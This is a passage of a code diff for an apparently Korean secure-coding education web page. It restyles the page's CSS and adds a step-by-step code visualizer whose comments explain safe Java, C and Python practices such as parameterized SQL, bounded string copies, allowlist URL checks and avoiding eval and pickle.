@@ -62,14 +62,36 @@ h2.st{font-size:23px;margin-bottom:6px}.sub{color:var(--muted);font-size:14px;ma
 .catinfo .ci-row{font-size:13.5px;line-height:1.65;color:#334155;margin-bottom:5px}
 .catinfo .ci-row b{color:#0f172a;margin-right:6px}
 .cgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:16px}
-.ccard{background:#fff;border:1px solid var(--line);border-radius:14px;overflow:hidden;transition:.2s}
+.ccard{background:#fff;border:1px solid var(--line);border-radius:14px;overflow:hidden;transition:all 0.3s cubic-bezier(0.4, 0, 0.2, 1);box-shadow:0 2px 8px rgba(0,0,0,0.02)}
+.ccard:hover{transform:translateY(-2px);box-shadow:0 6px 18px rgba(0,0,0,0.05)}
 .ccard.done{border-color:#bbf7d0;box-shadow:0 0 0 2px #dcfce7 inset}
-.ccard .ch{padding:15px 18px;cursor:pointer;display:flex;justify-content:space-between;align-items:flex-start;gap:10px}
-.ccard .ch h4{font-size:15.5px;line-height:1.4}.ccard .ch .cwe{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--muted);margin-top:3px}
-.ccard .badge{font-size:10.5px;color:#fff;border-radius:20px;padding:2px 9px;white-space:nowrap;font-family:'JetBrains Mono',monospace}
-.ccard .detail{display:none;padding:0 18px 16px;border-top:1px solid var(--line)}.ccard.open .detail{display:block}
-.ccard.open{grid-column:1/-1}
+.ccard .ch{padding:15px 18px;cursor:pointer;display:flex;justify-content:space-between;align-items:flex-start;gap:10px;transition:background 0.2s}
+.ccard .ch:hover{background:#f8fafc}
+.ccard .ch h4{font-size:15.5px;line-height:1.4;color:#1e293b;transition:color 0.2s}
+.ccard:hover h4{color:var(--p)}
+.ccard .ch .cwe{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--muted);margin-top:3px}
+.ccard .badge{font-size:10.5px;color:#fff;border-radius:20px;padding:2px 9px;white-space:nowrap;font-family:'JetBrains Mono',monospace;box-shadow:0 2px 6px rgba(0,0,0,0.05)}
+.ccard .detail{max-height:0;overflow:hidden;padding:0 18px;border-top:1px solid transparent;transition:max-height 0.4s cubic-bezier(0.4, 0, 0.2, 1), padding 0.4s ease, border-color 0.4s ease}
+.ccard.open .detail{max-height:2500px;padding:16px 18px 22px;border-top-color:var(--line)}
+.ccard.open{grid-column:1/-1;box-shadow:0 10px 25px rgba(0,0,0,0.04);border-color:var(--p)}
+.ccard .detail > * {opacity:0;transform:translateY(10px);transition:opacity 0.35s ease 0.1s, transform 0.35s ease 0.1s}
+.ccard.open .detail > * {opacity:1;transform:translateY(0)}
 .ccard .fld{margin-top:12px}.ccard .fld .lb{font-size:12px;font-weight:700;color:var(--p);margin-bottom:3px}.ccard .fld .tx{font-size:14px;color:#334155;line-height:1.65}
+.sim-card{background:#f8fafc;border:1px solid #e2e8f0;border-radius:12px;padding:16px;margin-top:8px}
+.sim-scen{font-size:13.5px;color:#334155;margin-bottom:8px;line-height:1.5}
+.sim-payload{font-size:13px;margin-bottom:10px}
+.sim-payload code{background:#f1f5f9;color:#b91c1c;padding:3px 8px;border-radius:6px;font-family:'JetBrains Mono',monospace;font-weight:700}
+.sim-terminal{background:#0b0f19;color:#e2e8f0;font-family:'JetBrains Mono',monospace;font-size:12px;padding:12px 14px;border-radius:8px;min-height:80px;white-space:pre-wrap;border:1px solid #1e293b;line-height:1.6;margin-top:8px;transition:all 0.3s}
+.sim-terminal.active{border-color:#ef4444;box-shadow:0 0 10px rgba(239,68,68,0.15)}
+.bcard { transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
+.bcard:hover { transform: translateY(-2px); box-shadow: 0 8px 24px rgba(2,6,23,.08); border-color: var(--p); }
+.bcard .cpre { transition: border-color 0.2s; position: relative; }
+.bcard .cpre.active-line-highlight { border-color: #38bdf8; box-shadow: 0 0 8px rgba(56,189,248,0.2) }
+.basic-dbg-panel { background: #070b13; border: 1px solid #1e293b; border-radius: 10px; padding: 12px 14px; margin-top: 10px; font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #94a3b8; line-height: 1.5; max-height: 240px; overflow-y: auto; text-align: left; box-shadow: inset 0 2px 8px rgba(0,0,0,0.8); }
+.basic-dbg-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #1e293b; padding-bottom: 6px; margin-bottom: 8px; font-weight: 700; color: #38bdf8; }
+.basic-dbg-step { color: #f1f5f9; margin-bottom: 4px; display: flex; gap: 8px; align-items: flex-start; opacity: 0; transform: translateY(5px); animation: basicStepIn 0.3s forwards; }
+@keyframes basicStepIn { to { opacity: 1; transform: translateY(0); } }
+.basic-dbg-desc { font-size: 11.5px; color: #cbd5e1; border-left: 2px solid var(--p); padding-left: 8px; margin-top: 6px; }
 .dtnote{font-size:12px;color:var(--muted);line-height:1.55;margin:2px 0 8px}
 .exambox{border:1px solid #f59e0b;border-left-width:4px;background:#fffbeb;border-radius:9px;padding:9px 12px;margin:0 0 12px}
 .examh{font-weight:700;color:#b45309;font-size:13px;margin-bottom:4px}
@@ -324,52 +346,69 @@ select.pin{width:100%;max-width:360px;padding:9px 11px;border:1px solid #cbd5e1;
 @media(max-width:768px){.gam-lv .lv-bar{width:80px}.gam-row{gap:7px}.gam-chip{font-size:12px;padding:6px 11px}
   .lb-row{grid-template-columns:38px 1fr 56px 70px;font-size:12.5px}.lb-st{display:none}}
 /* B2B SaaS Demo CSS */
-.saas-container{display:flex;flex-direction:column;gap:24px}
-.saas-section{background:#fff;border:1px solid var(--line);border-radius:16px;padding:26px;box-shadow:0 6px 18px rgba(2,6,23,.05)}
-.saas-section h3{font-size:18px;margin-bottom:12px;display:flex;align-items:center;gap:8px;color:#1e293b}
-.saas-badge{background:#4f46e5;color:#fff;font-size:11px;font-weight:700;border-radius:20px;padding:3px 9px;text-transform:uppercase}
-.saas-grid-2{display:grid;grid-template-columns:1fr 1fr;gap:20px}
+.saas-container{display:flex;flex-direction:column;gap:30px}
+.saas-section{background:#ffffff;border:1px solid #e2e8f0;border-radius:18px;padding:28px;box-shadow:0 8px 30px rgba(0,0,0,0.04);transition:all 0.3s cubic-bezier(0.4, 0, 0.2, 1);position:relative;overflow:hidden}
+.saas-section::before{content:"";position:absolute;top:0;left:0;width:100%;height:4px;background:linear-gradient(90deg, #4f46e5, #06b6d4)}
+.saas-section:hover{transform:translateY(-2px);box-shadow:0 12px 38px rgba(79,70,229,0.06)}
+.saas-section h3{font-size:19px;margin-bottom:14px;display:flex;align-items:center;gap:10px;color:#0f172a;font-weight:700}
+.saas-badge{background:linear-gradient(135deg, #4f46e5, #6366f1);color:#fff;font-size:10px;font-weight:800;border-radius:20px;padding:3px 10px;text-transform:uppercase;letter-spacing:0.5px}
+.saas-grid-2{display:grid;grid-template-columns:1fr 1fr;gap:24px}
 @media(max-width:820px){.saas-grid-2{grid-template-columns:1fr}}
-.sandbox-box{border:1px solid #1e293b;border-radius:12px;overflow:hidden;background:#0f172a;color:#cbd5e1;font-family:'JetBrains Mono',monospace}
-.sandbox-header{background:#1e293b;padding:10px 14px;font-size:13px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #0f172a}
+.sandbox-box{border:1px solid #334155;border-radius:14px;overflow:hidden;background:#0b0f19;color:#e2e8f0;font-family:'JetBrains Mono',monospace;box-shadow:0 10px 25px -5px rgba(0,0,0,0.3)}
+.sandbox-header{background:#1e293b;padding:12px 16px;font-size:13px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #0f172a}
 .sandbox-dot{display:inline-block;width:10px;height:10px;border-radius:50%;margin-right:4px}
-.sandbox-body{padding:14px;font-size:12.5px;min-height:120px;display:flex;flex-direction:column;gap:10px}
-.sandbox-editor-p{background:#020617;padding:10px;border-radius:8px;border:1px solid #334155;color:#e2e8f0;font-size:12.5px;line-height:1.55}
-.sandbox-input-row{display:flex;gap:8px;align-items:center;margin-top:6px}
-.sandbox-input{flex:1;background:#1e293b;border:1px solid #475569;color:#fff;padding:8px 12px;border-radius:6px;font-family:inherit;font-size:13px}
-.sandbox-input:focus{outline:none;border-color:#6366f1}
-.sandbox-preview{background:#f8fafc;color:#1e293b;border:1px solid #e2e8f0;border-radius:8px;padding:12px;font-family:sans-serif;font-size:13px;min-height:90px}
-.sandbox-preview.exploited{background:#fef2f2;border-color:#fca5a5}
-.sandbox-preview.secured{background:#f0fdf4;border-color:#bbf7d0}
-.sandbox-console{background:#020617;color:#38bdf8;padding:8px 12px;border-radius:6px;font-size:12px;min-height:48px;white-space:pre-wrap}
-.hook-ide{border:1px solid #2e3440;border-radius:10px;background:#232731;color:#d8dee9;font-family:'JetBrains Mono',monospace;font-size:12.5px;overflow:hidden}
-.hook-ide-h{background:#2f343f;padding:8px 12px;font-size:11.5px;display:flex;align-items:center;justify-content:space-between}
-.hook-ide-body{padding:14px;position:relative}
-.hook-warning{background:rgba(235,94,85,0.15);border-left:4px solid #eb5e55;padding:10px 12px;border-radius:0 6px 6px 0;margin-top:10px}
-.hook-warning-h{color:#eb5e55;font-weight:700;font-size:13px;display:flex;align-items:center;gap:6px}
-.hook-warning-b{font-size:12px;color:#cbd5e1;margin-top:4px}
-.hook-warning-lnk{color:#a5b4fc;text-decoration:underline;cursor:pointer;font-weight:700}
-.hook-jira{border:1.5px dashed #3b82f6;border-radius:10px;background:#eff6ff;padding:14px;color:#1e3a8a}
-.hook-jira-h{font-size:13px;font-weight:700;margin-bottom:6px;display:flex;align-items:center;gap:6px}
-.hook-jira-widget{background:#fff;border:1px solid #bfdbfe;border-radius:8px;padding:12px;margin-top:8px}
-.persona-sel{padding:10px 14px;border:1.5px solid var(--p);border-radius:10px;font-size:14px;width:100%;max-width:320px;font-family:inherit;margin-bottom:14px}
-.persona-paths{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:12px}
-.persona-card{border:1px solid var(--line);border-radius:12px;padding:14px;background:#f8fafc;transition:.2s}
-.persona-card.active{border-color:var(--p);background:#eef2ff;box-shadow:0 0 0 2px var(--p) inset}
-.persona-card-h{font-weight:700;font-size:14.5px;margin-bottom:4px}
-.persona-card-d{font-size:12px;color:var(--muted)}
-.tour-lb{border:1px solid var(--line);border-radius:12px;overflow:hidden;background:#fff}
-.tour-row{display:grid;grid-template-columns:48px 1fr 64px 80px;padding:10px 12px;border-bottom:1px solid #f1f5f9;font-size:13px;align-items:center}
+.sandbox-body{padding:16px;font-size:12.5px;min-height:120px;display:flex;flex-direction:column;gap:12px}
+.sandbox-editor-p{background:#030712;padding:12px;border-radius:10px;border:1px solid #1e293b;color:#f3f4f6;font-size:12.5px;line-height:1.6}
+.sandbox-input-row{display:flex;gap:10px;align-items:center;margin-top:8px}
+.sandbox-input{flex:1;background:#1e293b;border:1px solid #475569;color:#fff;padding:10px 14px;border-radius:8px;font-family:inherit;font-size:13px;transition:all 0.2s}
+.sandbox-input:focus{outline:none;border-color:#6366f1;box-shadow:0 0 0 3px rgba(99,102,241,0.2)}
+.sandbox-preview{background:#f8fafc;color:#1e293b;border:1px solid #e2e8f0;border-radius:10px;padding:16px;font-family:sans-serif;font-size:13px;min-height:110px;transition:all 0.3s;box-shadow:inset 0 2px 4px rgba(0,0,0,0.02)}
+.sandbox-preview.exploited{background:#fff5f5;border-color:#feb2b2;box-shadow:0 0 15px rgba(239,68,68,0.1), inset 0 2px 4px rgba(0,0,0,0.02)}
+.sandbox-preview.secured{background:#f0fdf4;border-color:#bbf7d0;box-shadow:0 0 15px rgba(34,197,94,0.1), inset 0 2px 4px rgba(0,0,0,0.02)}
+.sandbox-console{background:#030712;color:#38bdf8;padding:12px;border-radius:8px;font-size:12px;min-height:70px;white-space:pre-wrap;border:1px solid #1e293b;line-height:1.5;font-family:'JetBrains Mono',monospace}
+.hook-ide{border:1px solid #2d3139;border-radius:12px;background:#1e222a;color:#abb2bf;font-family:'JetBrains Mono',monospace;font-size:12.5px;overflow:hidden;box-shadow:0 10px 25px -5px rgba(0,0,0,0.25)}
+.hook-ide-h{background:#21252b;padding:10px 14px;font-size:11.5px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #181a1f}
+.hook-ide-body{padding:16px;position:relative;background:#282c34}
+.hook-warning{background:rgba(224,108,117,0.12);border-left:4px solid #e06c75;padding:12px 14px;border-radius:0 8px 8px 0;margin-top:12px;border-top:1px solid rgba(224,108,117,0.1);border-right:1px solid rgba(224,108,117,0.1);border-bottom:1px solid rgba(224,108,117,0.1)}
+.hook-warning-h{color:#e06c75;font-weight:700;font-size:13px;display:flex;align-items:center;gap:6px}
+.hook-warning-b{font-size:12px;color:#abb2bf;margin-top:6px;line-height:1.5}
+.hook-warning-lnk{color:#61afef;text-decoration:none;cursor:pointer;font-weight:700;transition:color 0.2s}
+.hook-warning-lnk:hover{color:#98c379;text-decoration:underline}
+.hook-jira{border:1.5px dashed #3b82f6;border-radius:12px;background:#f0f7ff;padding:16px;color:#1e3a8a;box-shadow:0 4px 12px rgba(59,130,246,0.03)}
+.hook-jira-h{font-size:13px;font-weight:700;margin-bottom:8px;display:flex;align-items:center;gap:6px;color:#1d4ed8}
+.hook-jira-widget{background:#fff;border:1px solid #bfdbfe;border-radius:10px;padding:14px;margin-top:10px;box-shadow:0 2px 8px rgba(0,0,0,0.02)}
+.persona-sel{padding:10px 14px;border:2px solid var(--p);border-radius:10px;font-size:14px;width:100%;max-width:320px;font-family:inherit;margin-bottom:18px;background:#fff;color:#1e293b;font-weight:600;transition:all 0.2s}
+.persona-sel:focus{outline:none;box-shadow:0 0 0 3px rgba(79,70,229,0.15)}
+.persona-paths{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:14px}
+.persona-card{border:1px solid #e2e8f0;border-radius:14px;padding:16px;background:#f8fafc;transition:all 0.25s ease;position:relative}
+.persona-card.active{border-color:var(--p);background:#f5f3ff;box-shadow:0 4px 15px rgba(79,70,229,0.06), 0 0 0 2px var(--p) inset}
+.persona-card-h{font-weight:700;font-size:15px;margin-bottom:6px;color:#1e293b}
+.persona-card-d{font-size:12px;color:var(--muted);display:flex;justify-content:space-between;align-items:center}
+.persona-badge{font-size:10px;font-weight:700;padding:2px 6px;border-radius:12px}
+.tour-lb{border:1px solid #e2e8f0;border-radius:14px;overflow:hidden;background:#fff;box-shadow:0 4px 15px rgba(0,0,0,0.02)}
+.tour-row{display:grid;grid-template-columns:48px 1fr 90px 80px;padding:12px 16px;border-bottom:1px solid #f1f5f9;font-size:13px;align-items:center;transition:background 0.2s}
+.tour-row:hover{background:#f8fafc}
 .tour-row.head{background:#f8fafc;font-weight:700;border-bottom-width:2px;font-size:11.5px;color:var(--muted)}
-.tour-rank{text-align:center;font-weight:700}
-.tour-name{font-weight:600}
-.tour-xp{text-align:right;font-family:'JetBrains Mono',monospace;color:#4f46e5;font-weight:700}
-.tour-streak{text-align:right}
-.semgrep-panel{display:grid;grid-template-columns:1fr 1.2fr;gap:14px}
+.tour-row.rank-1{background:linear-gradient(90deg, #fffbeb, #fff);border-left:4px solid #fbbf24}
+.tour-row.rank-2{background:linear-gradient(90deg, #f1f5f9, #fff);border-left:4px solid #cbd5e1}
+.tour-row.rank-3{background:linear-gradient(90deg, #fff7ed, #fff);border-left:4px solid #fb923c}
+.tour-rank{text-align:center;font-weight:800;font-size:14px;color:#475569}
+.tour-row.rank-1 .tour-rank{color:#d97706}
+.tour-row.rank-2 .tour-rank{color:#475569}
+.tour-row.rank-3 .tour-rank{color:#ea580c}
+.tour-name{font-weight:600;color:#334155}
+.tour-xp{text-align:right;font-family:'JetBrains Mono',monospace;color:#4f46e5;font-weight:800;font-size:13.5px}
+.tour-streak{text-align:right;font-weight:600;color:#e11d48}
+.semgrep-panel{display:grid;grid-template-columns:1fr 1.1fr;gap:20px}
 @media(max-width:820px){.semgrep-panel{grid-template-columns:1fr}}
-.semgrep-log{background:#0f172a;color:#f8fafc;border-radius:12px;padding:14px;font-family:'JetBrains Mono',monospace;font-size:11.5px;border:1px solid #1e293b;overflow-y:auto;max-height:280px}
-.semgrep-finding{border-left:3px solid #ef4444;background:rgba(239,68,68,0.1);padding:6px 10px;margin-bottom:10px;border-radius:0 6px 6px 0}
-.semgrep-finding.fixed{border-left-color:#22c55e;background:rgba(34,197,94,0.1)}
+.semgrep-log{background:#030712;color:#f3f4f6;border-radius:14px;padding:16px;font-family:'JetBrains Mono',monospace;font-size:11.5px;border:1px solid #1e293b;overflow-y:auto;max-height:280px;line-height:1.5}
+.semgrep-finding{border-left:4px solid #ef4444;background:rgba(239,68,68,0.08);padding:8px 12px;margin-bottom:12px;border-radius:0 8px 8px 0;border-top:1px solid rgba(239,68,68,0.05);border-right:1px solid rgba(239,68,68,0.05);border-bottom:1px solid rgba(239,68,68,0.05)}
+.semgrep-finding.fixed{border-left-color:#22c55e;background:rgba(34,197,94,0.08);border-top-color:rgba(34,197,94,0.05);border-right-color:rgba(34,197,94,0.05);border-bottom-color:rgba(34,197,94,0.05)}
+.persona-prog-container{background:#e2e8f0;border-radius:10px;height:8px;overflow:hidden;margin-bottom:18px;display:flex}
+.persona-prog-bar{background:linear-gradient(90deg, #4f46e5, #06b6d4);height:100%;transition:width 0.4s cubic-bezier(0.4, 0, 0.2, 1)}
+.persona-prog-info{display:flex;justify-content:space-between;font-size:12px;font-weight:700;color:#475569;margin-bottom:6px}
+.ai-fix-btn{background:#e0f2fe;color:#0369a1;border:1px solid #bae6fd;padding:6px 12px;border-radius:6px;font-size:11.5px;font-weight:700;cursor:pointer;display:inline-flex;align-items:center;gap:4px;margin-top:6px;transition:all 0.2s}
+.ai-fix-btn:hover{background:#0284c7;color:#fff;border-color:#0284c7}
 @media print{
   body{background:#fff!important}
   body *{visibility:hidden}
@@ -685,28 +724,401 @@ function toolsHtml(){
 // ===== 기초 과정 (Java·C·Python) =====
 const BLANGC={'Java':'#b07219','C':'#555555','Python':'#3572A5'};
 let basicLang='Java';
+let basicIntervals={};
+
+function getBasicSteps(lang, topic, code) {
+  const lines = code.split('\n');
+  const stepsMap = {
+    'Java_변수와 자료형': [
+      '30을 담은 4바이트 정수 변수 age 선언',
+      '큰 숫자를 다루기 위한 8바이트 long 변수 big 선언',
+      '소수점 아래 값을 가지는 double 실수 변수 rate 선언',
+      '논리값 true를 저장하는 boolean 변수 ok 선언',
+      '문자열 객체 name 선언 및 홍길동 저장',
+      '🔍 [보안 진단]: 정수형 한계를 넘거나 잘못된 자료형 변환 시 프로그램이 에러를 일으킵니다.'
+    ],
+    'Java_제어문과 반복': [
+      '사용자의 admin 권한 체크 분기 시작',
+      '권한이 통과되면 grantAccess() 호출',
+      '권한이 없으면 denyAccess() 호출 (안전한 접근 차단)',
+      '목록 개수만큼 반복문 시작',
+      '각 항목을 하나씩 순회하며 안전한 비즈니스 처리 수행',
+      '🔍 [보안 진단]: 이 분기문이 클라이언트가 아닌 서버 측에서 완전히 검증되는지 확인하는 것이 핵심입니다.'
+    ],
+    'Java_메소드': [
+      '외부 입력 두 정수를 가산하는 public 메소드 선언',
+      'a와 b의 합을 안전하게 반환',
+      '중요 비밀 키 목록을 반환하는 private 메소드 선언',
+      '내부 private 배열의 참조를 그대로 반환 (보안 위배: 참조 노출!)',
+      '🔍 [보안 진단]: private 배열을 복사본 복사 없이 직접 반환하면 외부에서 악의적으로 변형할 수 있습니다.'
+    ],
+    'Java_클래스와 객체': [
+      'Account 클래스 및 멤버 정의',
+      '계좌 잔액 필드를 private으로 선언하여 외부 직접 접근 및 악성 변조 차단',
+      '돈을 입금하는 public 검증 메소드 선언',
+      '입금액이 0보다 큰 양수인 경우에만 안전하게 잔액 반영',
+      '🔍 [보안 진단]: 중요 변수는 private으로 감싸고, 오직 안전하게 검증된 setter 메소드로만 조작하도록 합니다.'
+    ],
+    'Java_예외 처리': [
+      '커넥션 자원 획득 및 사용 시도',
+      '커넥션 열기 수행',
+      '획득된 자원을 통한 비즈니스 로직 수행',
+      'IOException 발생 시 에러 로그 기록 (민감 스택트레이스 유출 방지)',
+      'finally 블록 진입 (예외가 나도 무조건 실행)',
+      '안전하게 커넥션 닫기 (메모리 및 자원 누수 차단)',
+      '🔍 [보안 진단]: 자원 해제를 생략하면 연결 고갈로 서버가 마비되며, 에러 상세가 유출되면 해킹 단서가 됩니다.'
+    ],
+    'Java_외부 입력과 DB 접근': [
+      '클라이언트 웹 요청 파라미터 id 수집 (신뢰 불가 입력값)',
+      'PreparedStatement 바인딩 SQL 준비 (? 매개변수 바인딩 사용)',
+      '첫 번째 파라미터 ? 에 id 문자열 세팅 (SQL 쿼리 파싱 차단)',
+      '쿼리 안전 실행',
+      '🔍 [보안 진단]: 쿼리 문자열과 파라미터를 분리하지 않고 더하기(+) 연산자로 결합하면 쿼리가 깨지면서 SQL injection을 당합니다.'
+    ],
+    'Java_멀티스레드와 동기화': [
+      'synchronized 키워드를 사용해 한 번에 하나의 스레드만 실행하도록 보장',
+      '잔액(balance)이 출금 요청액 이상인지 검사 (동시 요청 시 중복 출금 방지)',
+      '잔액에서 출금액 차감',
+      '🔍 [보안 진단]: 멀티스레드 환경에서 동기화가 없으면 잔액이 10만원인데 동시에 10만원씩 2번 요청할 때 둘 다 출금되는 사고가 터집니다.'
+    ],
+    'C_변수와 자료형': [
+      '정수 변수 count를 0으로 선언 및 안전하게 초기화',
+      '문자 변수 grade 선언 및 A 할당',
+      'long형 변수 total 선언 및 0 할당',
+      '부호 없는 unsigned int 변수 선언',
+      '🔍 [보안 진단]: C언어에서 변수를 초기화하지 않으면 메모리에 남아있던 쓰레기 값이 주입되어 오동작의 불씨가 됩니다.'
+    ],
+    'C_포인터': [
+      '정수 변수 x 선언 및 10 대입',
+      '포인터 변수 p에 x의 메모리 주소(&x) 할당',
+      'p를 역참조(*p)하여 x의 실제 값 10을 메모리에서 로드 및 출력',
+      '포인터가 가리키는 주소가 유효한지 NULL 검사 수행',
+      '안전하게 주소값 역참조하여 값을 20으로 변환',
+      '🔍 [보안 진단]: 검증되지 않은 잘못된 메모리 주소(NULL 등)를 역참조하면 하드웨어 폴트가 나서 프로그램이 즉사합니다.'
+    ],
+    'C_배열과 문자열': [
+      '크기가 16바이트인 캐릭터 배열 buf 선언',
+      'strncpy를 이용해 대상 크기(sizeof-1)만큼만 안전 복사',
+      '배열의 마지막 칸에 널 문자(\\0) 강제 종결 처리',
+      '🔍 [보안 진단]: strcpy는 문자열 길이를 따지지 않아 버퍼 바깥 메모리를 덮어쓰고, 이것이 권한 탈취로 귀결됩니다.'
+    ],
+    'C_동적 메모리': [
+      'malloc을 통해 BUFFER_SIZE 만큼의 힙 메모리 공간 확보',
+      '메모리가 정상 할당되었는지 NULL 여부 검사',
+      '메모리 크기 한도 내에서 안전하게 문자열 복사',
+      '사용이 끝난 메모리 자원 free로 해제',
+      '포인터 변수에 NULL을 대입하여 해제된 자원을 다시 접근하는 UAF(Use After Free) 차단',
+      '🔍 [보안 진단]: 해제하지 않은 동적 메모리는 서버 다운을 유발하고, 해제 후 재사용은 임의 코드 실행으로 번집니다.'
+    ],
+    'C_함수와 재귀': [
+      '팩토리얼 재귀 함수 정의',
+      '재귀 탈출을 위한 종료 조건(기저 사례 n <= 1) 평가',
+      'n이 클 경우 자기 자신을 다시 호출하여 다음 재귀 수행',
+      '🔍 [보안 진단]: 탈출 루프 조건이 어긋나면 무한 루프에 돌며 스택 프레임이 마구 누적되다 스택 오버플로우로 꺼집니다.'
+    ],
+    'C_표준 입출력과 위험 함수': [
+      '100바이트 문자배열 str 정의',
+      'fgets 함수를 통해 지정된 버퍼 크기 내에서만 표준입력 수신',
+      '🔍 [보안 진단]: gets() 함수는 입력 데이터 한계 제어가 아예 불가능하므로 절대로 상용 소스코드에 써서는 안 됩니다.'
+    ],
+    'Python_변수와 자료형': [
+      '변수 age에 int형 30 바인딩',
+      '변수 rate에 float형 0.75 바인딩',
+      '변수 name에 str형 홍길동 바인딩',
+      '변수 ok에 bool형 True 바인딩',
+      '변수 items에 list형 [1, 2, 3] 바인딩',
+      '🔍 [보안 진단]: 파이썬은 실행 시 타입이 정해지므로, 외부 입력이 엉뚱한 타입으로 유입 시 예외 크래시를 방지하기 위해 타입 검증이 중요합니다.'
+    ],
+    'Python_제어문과 함수': [
+      '비밀번호 유효성을 확인하는 check_password 함수 정의',
+      '정규표현식 모듈 로드',
+      '영문+숫자 혼합 8자리 이상 유효성 정규식 준비',
+      '입력받은 pw가 규칙에 맞는지 대조한 결과를 불리언으로 반환',
+      '사용자 비밀번호 검증 결과 분기',
+      '검증 통과 시 가입 처리 진행',
+      '🔍 [보안 진단]: 유효하지 않고 취약한 패스워드는 무차별 대입 및 대입 크리덴셜 해킹에 쉽게 털리게 됩니다.'
+    ],
+    'Python_자료구조(list·dict·set)': [
+      '안전한 서버 도메인을 보관하는 set 허용목록 정의',
+      '사용자가 건넨 URL에서 hostname 파트만 안전하게 추출',
+      '추출한 host가 ALLOWED_HOSTS 목록에 등록되어 있는지 화이트리스트 검사',
+      '불허된 도메인은 에러 발생시켜 차단',
+      '🔍 [보안 진단]: 블랙리스트 필터링(..이나 로컬호스트 필터)은 우회법이 많습니다. 화이트리스트 도메인 제한이 정석입니다.'
+    ],
+    'Python_모듈과 예외': [
+      '수치 변환 예외 감시 영역 시작',
+      '문자열에서 공백 제거 후 정수로 파싱 시도',
+      'ValueError 예외 발생 시 전용 에러 메시지 안내',
+      'FileNotFoundError 발생 시 파일 없음을 알림',
+      '🔍 [보안 진단]: except Exception: 과 같이 광범위하게 모든 오류를 삼켜버리면 원인 디버깅이 차단되고 예기치 못한 상태로 계속 실행됩니다.'
+    ],
+    'Python_외부 명령과 위험 함수': [
+      'ast 모듈과 subprocess 모듈 로드',
+      'ast.literal_eval을 사용해 악성 파이썬 실행 없이 안전하게 파이썬 리터럴 데이터 파싱',
+      '리스트 인자 형식으로 셸 해석기 없이 안전하게 ping 명령어 실행',
+      '🔍 [보안 진단]: eval()이나 os.system()을 쓰면 사용자가 명령어 뒤에 세미콜론(;)을 붙여 서버 통제권을 강취할 수 있습니다.'
+    ],
+    'Python_직렬화와 암호': [
+      'json과 bcrypt 모듈 로드',
+      'pickle 대신 안전하게 구조화 데이터만 파싱하는 json.loads 사용',
+      '솔트(Salt)를 자동 생성하고 강력한 해싱으로 비밀번호 단방향 암호화 수행',
+      '🔍 [보안 진단]: pickle은 악성코드가 담긴 객체 복원 시 강제 코드를 실행하고, 솔트 없는 해시는 레인보우 테이블로 해독됩니다.'
+    ],
+    'Python_웹 요청과 SSRF 방어': [
+      'requests 및 urlparse 모듈 로드',
+      '클라이언트 웹 매개변수로 입력받은 url 수집 (신뢰 불가)',
+      'url에서 호스트네임 파트 추출',
+      '화이트리스트 기반의 허용된 외부 호스트인지 검사',
+      '검증된 안전한 URL에 대해서만 외부 HTTP 요청 전송',
+      '🔍 [보안 진단]: URL 검증 없이 외부 요청을 실행하면 공격자가 내부 127.0.0.1 포트를 스캔하거나 AWS 메타데이터를 유출합니다.'
+    ]
+  };
+
+  const key = `${lang}_${topic}`;
+  const customSteps = stepsMap[key];
+  if (customSteps) {
+    return lines.map((line, idx) => ({
+      line: line,
+      comment: customSteps[idx] || '코드를 분석 실행합니다.'
+    })).concat(customSteps.length > lines.length ? [{
+      line: '🛡️ [보안 진단 핵심 가이드라인]',
+      comment: customSteps[customSteps.length - 1]
+    }] : []);
+  }
+  return lines.map((line, idx) => ({
+    line: line,
+    comment: `${idx + 1}번째 행을 분석 실행합니다.`
+  }));
+}
+
+function runBasicVisualizer(bi) {
+  if (basicIntervals[bi]) {
+    clearInterval(basicIntervals[bi]);
+  }
+  
+  const container = document.getElementById('bdbg-wrap-' + bi);
+  if (!container) return;
+  
+  const list = BASICS.filter(b => b.lang === basicLang);
+  const item = list[bi];
+  if (!item) return;
+  
+  const steps = getBasicSteps(item.lang, item.topic, item.code);
+  
+  container.innerHTML = `
+    <div class="basic-dbg-panel">
+      <div class="basic-dbg-header">
+        <span>⚡ Code Flow Visual Debugger</span>
+        <span style="font-size:10px; color:#64748b;" id="bdbg-status-${bi}">Analyzing...</span>
+      </div>
+      <div id="bdbg-steps-list-${bi}"></div>
+    </div>
+  `;
+  
+  const stepsList = document.getElementById('bdbg-steps-list-' + bi);
+  const statusSpan = document.getElementById('bdbg-status-' + bi);
+  const preElement = document.getElementById('bcode-' + bi);
+  
+  if (preElement) {
+    preElement.classList.add('active-line-highlight');
+  }
+
+  let stepIdx = 0;
+  function showNextStep() {
+    if (stepIdx >= steps.length) {
+      clearInterval(basicIntervals[bi]);
+      statusSpan.textContent = "Analysis Complete ✅";
+      statusSpan.style.color = "#10b981";
+      if (preElement) {
+        preElement.classList.remove('active-line-highlight');
+      }
+      return;
+    }
+    
+    const step = steps[stepIdx];
+    statusSpan.textContent = `Running line ${stepIdx + 1}/${steps.length - 1}...`;
+    
+    const stepEl = document.createElement('div');
+    stepEl.className = 'basic-dbg-step';
+    
+    const isWarning = step.line.includes('보안 진단') || step.line.includes('🛡️');
+    const color = isWarning ? '#f59e0b' : '#38bdf8';
+    const bg = isWarning ? 'rgba(245,158,11,0.06)' : 'transparent';
+    const border = isWarning ? '1px dashed rgba(245,158,11,0.2)' : 'none';
+    
+    stepEl.style.background = bg;
+    stepEl.style.border = border;
+    stepEl.style.padding = isWarning ? '6px 8px' : '2px';
+    stepEl.style.borderRadius = '6px';
+    stepEl.style.marginTop = isWarning ? '8px' : '2px';
+    
+    stepEl.innerHTML = `
+      <span style="color:${color}; font-weight:700;">▶</span>
+      <div>
+        <div style="font-family:'JetBrains Mono',monospace; color:${isWarning?'#f59e0b':'#e2e8f0'}; font-size:11.5px;">${esc(step.line)}</div>
+        <div class="basic-dbg-desc" style="border-left-color:${color};">${esc(step.comment)}</div>
+      </div>
+    `;
+    
